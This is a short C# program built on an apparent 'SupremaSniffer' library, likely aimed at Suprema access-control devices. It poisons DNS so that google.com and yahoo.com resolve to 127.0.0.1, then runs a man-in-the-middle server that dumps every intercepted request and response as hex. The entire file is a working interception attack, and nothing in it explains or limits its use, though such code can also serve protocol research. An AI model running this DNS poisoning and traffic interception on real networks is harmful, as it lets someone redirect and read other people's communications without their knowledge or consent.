using SupremaSniffer;

DnsPoisoner poisoner = new DnsPoisoner("127.0.0.1", new string[] { "google.com", "yahoo.com" });
poisoner.poison();

SupremaMessageParser suprema = new SupremaMessageParser();
MitmServer mitmServer = new MitmServer();
mitmServer.RequestCallback = delegate (string host, byte[] data) {
    Console.WriteLine("\n[Request]\n" + BitConverter.ToString(data)) ; 
};
mitmServer.ResponseCallback = delegate (string host, byte[] data) {
    Console.WriteLine("\n[Response]\n" + BitConverter.ToString(data)); 
};
mitmServer.run();

while (true)
{
    Thread.Sleep(1000);
}
